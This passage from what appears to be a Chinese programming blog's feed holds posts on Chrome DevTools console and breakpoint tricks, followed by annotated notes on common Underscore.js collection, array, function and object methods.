class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">log</span>(message) &#123;</span><br><span class="line">      console<span class="selector-class">.log</span>(</span><br><span class="line">        // 这句话是重点当我们 new 出来的 Error 对象时，会匹配它的stack 信息中的换行符，换行符出现的次数也等同于它在堆栈调用时的深度。</span><br><span class="line">        &#x27; &#x27;.repeat(new Error()<span class="selector-class">.stack</span><span class="selector-class">.match</span>(/\n/g)<span class="selector-class">.length</span> - <span class="number">2</span>) + message</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="built_in">foo</span>() &#123;</span><br><span class="line">      <span class="built_in">log</span>(&#x27;foo&#x27;);</span><br><span class="line">      return <span class="built_in">bar</span>() + <span class="built_in">bar</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="built_in">bar</span>() &#123;</span><br><span class="line">      <span class="built_in">log</span>(&#x27;bar&#x27;);</span><br><span class="line">      return <span class="built_in">baz</span>() + <span class="built_in">baz</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="built_in">baz</span>() &#123;</span><br><span class="line">      <span class="built_in">log</span>(&#x27;baz&#x27;);</span><br><span class="line">      return <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">foo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_4.png"></p><h3 id="10-直接在回调中使用-console-log"><a href="#10-直接在回调中使用-console-log" class="headerlink" title="10. 直接在回调中使用 console.log"></a>10. 直接在回调中使用 <code>console.log</code></h3><p>是不是经常有这样的情况，就是我确定要将什么传递给回调函数。在这种情况下，我会在里面添加一个 <code>console.log</code> 来检查。</p><p>有两种方式来实现：</p><ul><li>在回调方法的内部使用 <code>console.log</code></li><li><strong>直接使用 <code>consolelog</code> 来作为回调方法</strong>。</li></ul><p>我推荐使用第二种，因为这不仅减少了输入，还可能在回调中接收多个参数。(这在第一个解决方案中是没有的)</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_5.png"></p><h3 id="11-使用实时表达式"><a href="#11-使用实时表达式" class="headerlink" title="11. 使用实时表达式"></a>11. 使用实时表达式</h3><p>在本文形成的不久前，<code>DevTools</code> 在 <code>Console</code> 面板中引入了一个非常漂亮的附加功能，这是一个名为 <code>Live expression</code> 的工具</p><p>只需按下 “眼睛” 符号，你就可以在那里定义任何 <code>JavaScript</code> 表达式。 它会不断更新，所以表达的结果将永远，存在 :-)</p><p>同时支持定义好几个：</p><p><img src="/Blog/2019/03/18/chrome_debug/09%E4%B8%A8console%E4%B8%AD%E9%AA%9A%E6%93%8D%E4%BD%9C/index/img_2.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08丨对象&amp;方法</title>
      <link href="/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/"/>
      <url>/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<p>在我们调试 <code>Javascript</code> 的代码时，<code>对象</code> 和 <code>方法</code> 作为经常被我们调试的对象，所以这里介绍关于 <code>对象</code> 和 <code>方法</code> 的调试技巧。</p><h3 id="1-queryObjects-（对象查询）方法"><a href="#1-queryObjects-（对象查询）方法" class="headerlink" title="1. queryObjects （对象查询）方法"></a>1. <code>queryObjects</code> （对象查询）方法</h3><p><img src="/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/img.png"></p><p>假如我们有这样一段代码，我们在里面定义了一些对象。</p><p>问一个问题，我们怎么知道，在 <strong>特定的时刻</strong> + <strong>特定的执行上下文</strong> 有哪些对象呢？</p><p><code>DevTools</code> 里的 <code>queryObjects</code> 函数可以展示这些信息。</p><blockquote><p>请注意，列表中创建的最后一个对象是不可用的 : 在代码执行后，对于它的引用并没有留存下来，也就是说，我们只有 <code>3</code> 个 <code>person</code> 对象：</p></blockquote><p><img src="/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/img.gif"></p><h2 id="2-monitor-（监听器）方法"><a href="#2-monitor-（监听器）方法" class="headerlink" title="2. monitor （监听器）方法"></a>2. <code>monitor</code> （监听器）方法</h2><p><code>monitor</code> 是 <code>DevTools</code> 的一个方法， 它能够让你 <code>“潜入”</code> 到任何 <code>_function calls(方法的调用)</code> 中：每当一个 <code>被潜入</code> 的方法运行的时候，<code>console 控制台</code> 会把它的实例打印出来，包含 <strong>函数名</strong> 以及 <strong>调用它的参数</strong> 。</p><p>我们把前面例子里面的 <code>Person</code> 类拿过来，并且给它扩展两个方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name, role</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">role</span> = role;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getMessage</span>(<span class="string">&#x27;greeting&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getMessage</span>(<span class="params"><span class="keyword">type</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">type</span> === <span class="string">&#x27;greeting&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`Hello, I&#x27;m <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如你所见，<code>greet</code> 方法通过一个特殊的参数来执行 <code>getMessage</code> 方法，让我们看看对 <code>getMessage</code> 方法进行追踪会产生什么结果：</p><p><img src="/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/img_1.gif"></p><p>这样做，会让我们少写很多 <code>console.logs</code> !</p><h3 id="3-monitorEvents-（监听器事件）方法"><a href="#3-monitorEvents-（监听器事件）方法" class="headerlink" title="3. monitorEvents （监听器事件）方法"></a>3. <code>monitorEvents</code> （监听器事件）方法</h3><p>在上文中，我们讨论了用 <code>monitor</code> 方法来监听函数，其实还可以使用名为 <code>monitorEvents</code> 的方法，对 <code>events</code> 做一样的事情：</p><p><img src="/Blog/2019/03/17/chrome_debug/08%E4%B8%A8%E5%AF%B9%E8%B1%A1%EF%BC%86%E6%96%B9%E6%B3%95/index/img.webp"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07丨条件断点</title>
      <link href="/Blog/2019/03/16/chrome_debug/07%E4%B8%A8%E6%9D%A1%E4%BB%B6%E6%96%AD%E7%82%B9/index/"/>
      <url>/Blog/2019/03/16/chrome_debug/07%E4%B8%A8%E6%9D%A1%E4%BB%B6%E6%96%AD%E7%82%B9/index/</url>
      
        <content type="html"><![CDATA[<p>有时你设置的断点是不是被执行了太多次？假设有一个包含 200 个元素的循环，但是你只对第 110 次循环的结果感兴趣，又或者你只对一些满足某些条件的结果感兴趣，怎么办呢？这就是我们要说的条件断点：</p><h3 id="1-Conditional-breakpoints-条件断点"><a href="#1-Conditional-breakpoints-条件断点" class="headerlink" title="1. Conditional breakpoints 条件断点"></a>1. <code>Conditional breakpoints</code> 条件断点</h3><p>这样的情况下，你可以设置一个条件断点：</p><ul><li><p>右击行号，选择 <code>Add conditional breakpoint...(添加条件断点)</code></p></li><li><p>或者右击一个已经设置的断点并且选择 <code>Edit breakpoint(编辑断点)</code></p></li><li><p>然后输入一个执行结果为 <code>true</code> 或者 <code>false</code> 的表达式（它的值其实不需要完全为 <code>true</code> 或者 <code>false</code> 尽管那个弹出框的描述是这样说的）。</p></li></ul><p>在这个表达式中你可以使用任何这段代码可以获取到的值（当前行的作用域）。</p><p>如果条件成立，这个断点就会暂停代码的执行：</p><p><img src="/Blog/2019/03/16/chrome_debug/07%E4%B8%A8%E6%9D%A1%E4%BB%B6%E6%96%AD%E7%82%B9/index/img.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06丨异步的 console</title>
      <link href="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/"/>
      <url>/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/</url>
      
        <content type="html"><![CDATA[<p>如今，越来越多与浏览器有关的 API 都是 <em>基于 <code>Promise</code> 的</em> 。当你使用 <code>promise</code> 的时候通常配套用 <code>.then(处理方法)</code> 或者 将 <code>promise</code> 包裹在 <code>async</code> 方法中，再使用 <code>await</code> 来接收结果。</p><p>我们在 <code>JavaScript/TypeScript</code> 中大量使用的东西，但如果在 <code>Console</code> 中书写这样的结构很不方便。</p><p>像下面这样</p><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img.png"></p><p>或者这样</p><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img_1.png"></p><p>这样太难用了！不是输入之前就被触发了，就是括号漏写了…</p><blockquote><p><strong>但如果 <code>console</code> 默认就被 <code>async</code> 包裹呢？</strong></p></blockquote><p>你猜怎么着，还真是这样！你可以直接使用 <code>await</code> ：</p><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img.gif"></p><p>事实上,在 <code>Console</code> 中使用 <code>promise</code> 比在源码中使用起来还要简单！</p><h2 id="1-用你的异步console-来看一些更酷的东西"><a href="#1-用你的异步console-来看一些更酷的东西" class="headerlink" title="1. 用你的异步console 来看一些更酷的东西"></a>1. 用你的异步<code>console</code> 来看一些更酷的东西</h2><p>我和你一样，觉得 <code>fetch</code> 的例子相当无聊 – 所以再来一个新玩法：通过 <code>console</code> 来获取到更多有意思的信息。</p><ul><li><code>Storage</code> 系统的 <strong>占用数</strong> 和 <strong>空闲数</strong></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await navigator<span class="selector-class">.storage</span><span class="selector-class">.estimate</span>()</span><br></pre></td></tr></table></figure><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img_3.png"></p><ul><li>设备的 <strong>电池信息</strong></li></ul><p>为了达到更好的效果，我们将这个技巧和 <code>console.table</code> 来合并使用：</p><p>敲黑板：这是一条<a href="https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API">不推荐使用的API</a>,尽管看起来这么酷炫…</p><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img_4.png"></p><ul><li><strong>媒体能力</strong></li></ul><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img_5.png"></p><ul><li><strong>Cache storage keys</strong></li></ul><p>(注：<a href="https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage">Cache storage keys</a> 一般用来对 <code>request</code> 和 <code>response</code> 进行缓存)</p><p><img src="/Blog/2019/03/15/chrome_debug/06%E4%B8%A8%E5%BC%82%E6%AD%A5%E7%9A%84console/index/img_6.png"></p><p>更多的例子就不一一举例了。</p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Underscore 常用的一些方法</title>
      <link href="/Blog/2019/03/14/essay/Underscore%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95/index/"/>
      <url>/Blog/2019/03/14/essay/Underscore%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Collections"><a href="#Collections" class="headerlink" title="Collections"></a>Collections</h1><p><strong>reject</strong><code>_.reject(list, predicate, [context])</code> <br>Returns the values in <strong>list</strong> without the elements that the truth test (<strong>predicate</strong>) passes. The opposite of <strong>filter</strong>. <strong>predicate</strong> is transformed through <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> to facilitate shorthand syntaxes.</p><blockquote><p>var odds &#x3D; _.reject([1, 2, 3, 4, 5, 6], function(num){ return num % 2 &#x3D;&#x3D; 0; });<br>&#x3D;&gt; [1, 3, 5]</p></blockquote><p><strong>pluck</strong><code>_.pluck(list, propertyName) </code><br>A convenient version of what is perhaps the most common use-case for <strong>map</strong>: extracting a list of property values.</p><blockquote><p>var stooges &#x3D; [{name: ‘moe’, age: 40}, {name: ‘larry’, age: 50}, {name: ‘curly’, age: 60}];<br>_.pluck(stooges, ‘name’);<br>&#x3D;&gt; [“moe”, “larry”, “curly”]</p></blockquote><p><strong>max</strong><code>_.max(list, [iteratee], [context])</code> <br>Returns the maximum value in <strong>list</strong>. If an <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> function is provided, it will be used on each value to generate the criterion by which the value is ranked. <em>-Infinity</em> is returned if <strong>list</strong> is empty, so an <a href="https://underscorejs.org/#isEmpty">isEmpty</a> guard may be required. Non-numerical values in <strong>list</strong> will be ignored.</p><blockquote><p>var stooges &#x3D; [{name: ‘moe’, age: 40}, {name: ‘larry’, age: 50}, {name: ‘curly’, age: 60}];<br>_.max(stooges, function(stooge){ return stooge.age; });<br>&#x3D;&gt; {name: ‘curly’, age: 60};</p></blockquote><p><strong>min</strong><code>_.min(list, [iteratee], [context])</code> <br>Returns the minimum value in <strong>list</strong>. If an <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> function is provided, it will be used on each value to generate the criterion by which the value is ranked. <em>Infinity</em> is returned if <strong>list</strong> is empty, so an <a href="https://underscorejs.org/#isEmpty">isEmpty</a> guard may be required. Non-numerical values in <strong>list</strong> will be ignored.</p><blockquote><p>跟 <code>max</code> 相反。</p></blockquote><p><strong>shuffle</strong><code>_.shuffle(list)</code> <br>Returns a shuffled copy of the <strong>list</strong>, using a version of the <a href="http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle">Fisher-Yates shuffle</a>.</p><blockquote><p>_.shuffle([1, 2, 3, 4, 5, 6]);<br>&#x3D;&gt; [4, 1, 6, 3, 5, 2]<br>打乱一个数组。</p></blockquote><p><strong>sample</strong><code>_.sample(list, [n]) </code><br>Produce a random sample from the <strong>list</strong>. Pass a number to return <strong>n</strong> random elements from the list. Otherwise a single random item will be returned.</p><blockquote><p>_.sample([1, 2, 3, 4, 5, 6]);<br>&#x3D;&gt; 4</p><p>_.sample([1, 2, 3, 4, 5, 6], 3);<br>&#x3D;&gt; [1, 6, 2]<br>打乱并取出。</p></blockquote><p><strong>size</strong><code>_.size(list) </code><br>Return the <strong>number</strong> of values in the <strong>list</strong>.</p><blockquote><p>_.size([1, 2, 3, 4, 5]);<br>&#x3D;&gt; 5</p><p>_.size({one: 1, two: 2, three: 3});<br>&#x3D;&gt; 3<br>能统计 <code>&#123;...&#125;</code> 的 ‘length’，不知道会不会用的到。</p></blockquote><p><strong>partition</strong><code>_.partition(list, predicate)</code> <br>Split <strong>list</strong> into two arrays: one whose elements all satisfy <strong>predicate</strong> and one whose elements all do not satisfy <strong>predicate</strong>. <strong>predicate</strong> is transformed through <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> to facilitate shorthand syntaxes.</p><blockquote><p>_.partition([0, 1, 2, 3, 4, 5], v &#x3D;&gt; v%2);<br>&#x3D;&gt; [[1, 3, 5], [0, 2, 4]]<br>按条件分组</p></blockquote><h1 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h1><p><strong>compact</strong><code>_.compact(list) </code><br>Returns a copy of the list with all <strong>falsy values removed</strong>. In JavaScript, false, null, 0, “”, undefined and NaN are all falsy.</p><blockquote><p>_.compact([0, 1, false, 2, ‘’, 3]);<br>&#x3D;&gt; [1, 2, 3]<br>去除所有 <code>falsy</code></p></blockquote><p><strong>flatten</strong><code>_.flatten(array, [shallow]) </code><br>Flattens a nested <strong>array</strong> (the nesting can be to any depth). If you pass <strong>shallow</strong>, the array will only be flattened a single level.</p><blockquote><p>_.flatten([1, [2], [3, [[4]]]]);<br>&#x3D;&gt; [1, 2, 3, 4];</p><p>_.flatten([1, [2], [3, [[4]]]], true);<br>&#x3D;&gt; [1, 2, 3, [[4]]];<br>该方法在 <code>es10</code> 已出（<code>flat()</code>、<code>flatMap()</code>）</p></blockquote><p><strong>without</strong><code>_.without(array, *values) </code><br>Returns a copy of the <strong>array</strong> with all instances of the <strong>values removed</strong>.</p><blockquote><p>_.without([1, 2, 1, 0, 3, 1, 4], 0, 1);<br>&#x3D;&gt; [2, 3, 4]</p></blockquote><p><strong>difference</strong><code>_.difference(array, *others) </code><br>Similar to <strong>without</strong>, but returns the values from array that are not present in the <strong>other arrays</strong>.</p><blockquote><p>_.difference([1, 2, 3, 4, 5], [5, 2, 10]);<br>&#x3D;&gt; [1, 3, 4]<br>取出该数组与后面不同的元素</p></blockquote><p><strong>union</strong><code>_.union(*arrays) </code><br>Computes the <strong>union</strong> of the passed-in <strong>arrays</strong>: the list of unique items, in order, that are present in one or more of the <strong>arrays</strong>.</p><blockquote><p>_.union([1, 2, 3], [101, 2, 1, 10], [2, 1]);<br>&#x3D;&gt; [1, 2, 3, 101, 10]<br>虽然 <code>es6</code> 的 <code>set</code> 也支持去重，但是 <code>union</code> 还支持多参数。</p></blockquote><p><strong>intersection</strong><code>_.intersection(*arrays) </code><br>Computes the list of values that are the <strong>intersection</strong> of all the arrays. Each value in the result is present in each of the arrays.</p><blockquote><p>_.intersection([1, 2, 3], [101, 2, 1, 10], [2, 1]);<br>&#x3D;&gt; [1, 2]<br>只取出多个数组相交(重复)的元素。</p></blockquote><p><strong>uniq</strong><code>_.uniq(array, [isSorted], [iteratee])</code> Alias: <strong>unique</strong> <br>Produces a duplicate-free version of the <strong>array</strong>, using <em>&#x3D;&#x3D;&#x3D;</em> to test object equality. In particular only the first occurrence of each value is kept. If you know in advance that the <strong>array</strong> is sorted, passing <em>true</em> for <strong>isSorted</strong> will run a much faster algorithm. If you want to compute unique items based on a transformation, pass an <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> function.</p><blockquote><p>_.uniq([1, 2, 1, 4, 1, 3]);<br>&#x3D;&gt; [1, 2, 4, 3]<br>好像和 <code>union</code> 差不多，但是多一个迭代器的选项。</p></blockquote><p><strong>zip</strong><code>_.zip(*arrays) </code><br>Merges together the values of each of the <strong>arrays</strong> with the values at the corresponding position. Useful when you have separate data sources that are coordinated through matching array indexes. Use with apply to pass in an array of arrays. If you’re working with a matrix of nested arrays, this can be used to transpose the matrix.</p><blockquote><p>_.zip([‘moe’, ‘larry’, ‘curly’], [30, 40, 50], [true, false, false]);<br>&#x3D;&gt; [[“moe”, 30, true], [“larry”, 40, false], [“curly”, 50, false]]</p></blockquote><p><strong>unzip</strong><code>_.unzip(array)</code> <br>The opposite of <a href="https://underscorejs.org/#zip">zip</a>. Given an <strong>array</strong> of arrays, returns a series of new arrays, the first of which contains all of the first elements in the input arrays, the second of which contains all of the second elements, and so on.</p><blockquote><p>_.unzip([[“moe”, 30, true], [“larry”, 40, false], [“curly”, 50, false]]);<br>&#x3D;&gt; [[‘moe’, ‘larry’, ‘curly’], [30, 40, 50], [true, false, false]]</p></blockquote><p><strong>object</strong><code>_.object(list, [values])</code> <br>Converts arrays into objects. Pass either a single list of [key, value] pairs, or a list of keys, and a list of values. Passing by pairs is the reverse of <a href="https://underscorejs.org/#pairs">pairs</a>. If duplicate keys exist, the last value wins.</p><blockquote><p>_.object([‘moe’, ‘larry’, ‘curly’], [30, 40, 50]);<br>&#x3D;&gt; {moe: 30, larry: 40, curly: 50}</p><p>_.object([[‘moe’, 30], [‘larry’, 40], [‘curly’, 50]]);<br>&#x3D;&gt; {moe: 30, larry: 40, curly: 50}</p></blockquote><p><strong>chunk</strong><code>_.chunk(array, length) </code><br>Chunks an <strong>array</strong> into multiple arrays, each containing <strong>length</strong> or fewer items.</p><blockquote><p>var partners &#x3D; <em>.chunk(</em>.shuffle(kindergarten), 2);<br>&#x3D;&gt; [[“Tyrone”, “Elie”], [“Aidan”, “Sam”], [“Katrina”, “Billie”], [“Little Timmy”]]<br>按第二个参数分组。</p></blockquote><p><strong>range</strong><code>_.range([start], stop, [step]) </code><br>A function to create flexibly-numbered lists of integers, handy for each and map loops. <strong>start</strong>, if omitted, defaults to 0; <strong>step</strong> defaults to 1. Returns a list of integers from start (inclusive) to <strong>stop</strong> (exclusive), incremented (or decremented) by <strong>step</strong>, exclusive. Note that ranges that <strong>stop</strong> before they <strong>start</strong> are considered to be zero-length instead of negative — if you’d like a negative range, use a negative <strong>step</strong>.</p><blockquote><p>_.range(10);<br>&#x3D;&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]<br>_.range(1, 11);<br>&#x3D;&gt; [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]<br>_.range(0, 30, 5);<br>&#x3D;&gt; [0, 5, 10, 15, 20, 25]<br>_.range(0, -10, -1);<br>&#x3D;&gt; [0, -1, -2, -3, -4, -5, -6, -7, -8, -9]<br>_.range(0);<br>&#x3D;&gt; []</p></blockquote><h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p><strong>throttle</strong><code>_.throttle(function, wait, [options]) </code><br>Creates and returns a new, throttled version of the passed function, that, when invoked repeatedly, will only actually call the original function at most once per every wait milliseconds. Useful for rate-limiting events that occur faster than you can keep up with.</p><p>By default, throttle will execute the function as soon as you call it for the first time, and, if you call it again any number of times during the wait period, as soon as that period is over. If you’d like to disable the leading-edge call, pass {leading: false}, and if you’d like to disable the execution on the trailing-edge, pass<br><code>&#123;trailing: false&#125;</code>.</p><blockquote><p>var throttled &#x3D; _.throttle(updatePosition, 100);<br>$(window).scroll(throttled);<br>节流</p></blockquote><p>If you need to cancel a scheduled throttle, you can call .cancel() on the throttled function.</p><p><strong>debounce</strong><code>_.debounce(function, wait, [immediate]) </code><br>Creates and returns a new debounced version of the passed function which will postpone its execution until after wait milliseconds have elapsed since the last time it was invoked. Useful for implementing behavior that should only happen after the input has stopped arriving. For example: rendering a preview of a Markdown comment, recalculating a layout after the window has stopped being resized, and so on.</p><p>At the end of the wait interval, the function will be called with the arguments that were passed most recently to the debounced function.</p><p>Pass true for the immediate argument to cause debounce to trigger the function on the leading instead of the trailing edge of the wait interval. Useful in circumstances like preventing accidental double-clicks on a “submit” button from firing a second time.</p><blockquote><p>var lazyLayout &#x3D; _.debounce(calculateLayout, 300);<br>$(window).resize(lazyLayout);<br>节流</p></blockquote><p>If you need to cancel a scheduled debounce, you can call .cancel() on the debounced function.</p><p><strong>once</strong><code>_.once(function)</code><br>Creates a version of the function that can only be called one time. Repeated calls to the modified function will have no effect, returning the value from the original call. Useful for initialization functions, instead of having to set a boolean flag and then check it later.</p><blockquote><p>var initialize &#x3D; _.once(createApplication);<br>initialize();<br>initialize();<br>&#x2F;&#x2F; Application is only created once.</p></blockquote><p><strong>times</strong><code>_.times(n, iteratee, [context])</code> <br>Invokes the given iteratee function <strong>n</strong> times. Each invocation of <a href="https://underscorejs.org/#iteratee"><strong>iteratee</strong></a> is called with an <code>index</code> argument. Produces an array of the returned values.</p><blockquote><p>_.times(3, function(n){ console.log(n); });<br>比如说替代:<br>for (let i&#x3D;0;i&lt;3;i++;) {<br>console.log(i)<br>}</p></blockquote><p><strong>compose</strong><code>_.compose(*functions) </code><br>Returns the composition of a list of functions, where each function consumes the return value of the function that follows. In math terms, composing the functions <strong>f()</strong>, <strong>g()</strong>, and <strong>h()</strong> produces <strong>f(g(h()))</strong>.</p><blockquote><p>var greet    &#x3D; function(name){ return “hi: “ + name; };<br>var exclaim  &#x3D; function(statement){ return statement.toUpperCase() + “!”; };<br>var welcome &#x3D; _.compose(greet, exclaim);<br>welcome(‘moe’);<br>&#x3D;&gt; ‘hi: MOE!’<br>把后面的函数的返回值当做参数给前面的函数。</p></blockquote><h1 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h1><p><strong>allKeys</strong><code>_.allKeys(object) </code><br>Retrieve all the names of object’s own and inherited properties.</p><blockquote><p>function Stooge(name) {<br>this.name &#x3D; name;<br>}<br>Stooge.prototype.silly &#x3D; true;<br>_.allKeys(new Stooge(“Moe”));<br>&#x3D;&gt; [“name”, “silly”]</p></blockquote><p><strong>pairs</strong><code>_.pairs(object) </code><br>Convert an object into a list of   [key, value]  pairs. The opposite of <a href="https://underscorejs.org/#object">object</a>.</p><blockquote><p>_.pairs({one: 1, two: 2, three: 3});<br>&#x3D;&gt; [[“one”, 1], [“two”, 2], [“three”, 3]]<br>把对象的键值对转换成数组。</p></blockquote><p><strong>invert</strong><code>_.invert(object) </code><br>Returns a copy of the object where the keys have become the values and the values the keys. For this to work, all of your object’s values should be unique and string serializable.</p><blockquote><p>_.invert({Moe: “Moses”, Larry: “Louis”, Curly: “Jerome”});<br>&#x3D;&gt; {Moses: “Moe”, Louis: “Larry”, Jerome: “Curly”};<br>交换对象的键值对。</p></blockquote><p><strong>pick</strong><code>_.pick(object, *keys) </code><br>Return a copy of the <strong>object</strong>, filtered to only have <strong>values</strong> for the whitelisted keys (or array of valid keys). Alternatively accepts a predicate indicating which keys to pick.</p><blockquote><p>_.pick({name: ‘moe’, age: 50, userid: ‘moe1’}, ‘name’, ‘age’);<br>&#x3D;&gt; {name: ‘moe’, age: 50}<br>_.pick({name: ‘moe’, age: 50, userid: ‘moe1’}, function(value, key, object) {<br>return _.isNumber(value);<br>});<br>&#x3D;&gt; {age: 50}</p></blockquote><p><strong>omit</strong><code>_.omit(object, *keys) </code><br>Return a copy of the <strong>object</strong>, filtered to omit the blacklisted <strong>keys</strong> (or array of keys). Alternatively accepts a predicate indicating which keys to omit.</p><blockquote><p>_.omit({name: ‘moe’, age: 50, userid: ‘moe1’}, ‘userid’);<br>&#x3D;&gt; {name: ‘moe’, age: 50}<br>_.omit({name: ‘moe’, age: 50, userid: ‘moe1’}, function(value, key, object) {<br>return _.isNumber(value);<br>});<br>&#x3D;&gt; {name: ‘moe’, userid: ‘moe1’}</p></blockquote><p><strong>isEqual</strong><code>_.isEqual(object, other) </code><br>Performs an optimized deep <strong>comparison</strong> between the two objects, to determine if they should be considered equal.</p><blockquote><p>var stooge &#x3D; {name: ‘moe’, luckyNumbers: [13, 27, 34]};<br>var clone  &#x3D; {name: ‘moe’, luckyNumbers: [13, 27, 34]};<br>stooge &#x3D;&#x3D; clone;<br>&#x3D;&gt; false<br>_.isEqual(stooge, clone);<br>&#x3D;&gt; true</p></blockquote><p><strong>isMatch</strong><code>_.isMatch(object, properties) </code><br>Tells you if the keys and values in properties are contained in object.</p><blockquote><p>var stooge &#x3D; {name: ‘moe’, age: 32};<br>_.isMatch(stooge, {age: 32});<br>&#x3D;&gt; true</p></blockquote><p><strong>isEmpty</strong><code>_.isEmpty(object) </code><br>Returns true if an enumerable object contains no values (no enumerable own-properties). For strings and array-like objects _.isEmpty checks if the length property is 0.</p><blockquote><p>_.isEmpty([1, 2, 3]);<br>&#x3D;&gt; false<br>_.isEmpty({});<br>&#x3D;&gt; true</p></blockquote><p><strong>isArray</strong><code>_.isArray(object) </code><br>Returns true if object is an Array.</p><blockquote><p>(function(){ return _.isArray(arguments); })();<br>&#x3D;&gt; false<br>_.isArray([1,2,3]);<br>&#x3D;&gt; true</p></blockquote><p><strong>isObject</strong><code>_.isObject(value) </code><br>Returns true if value is an Object. Note that JavaScript arrays and functions are objects, while (normal) strings and numbers are not.</p><blockquote><p>_.isObject({});<br>&#x3D;&gt; true<br>_.isObject(1);<br>&#x3D;&gt; false</p></blockquote><p><strong>isNaN</strong><code>_.isNaN(object) </code><br>Returns true if object is NaN.<br>Note: this is not the same as the native isNaN function, which will also return true for many other not-number 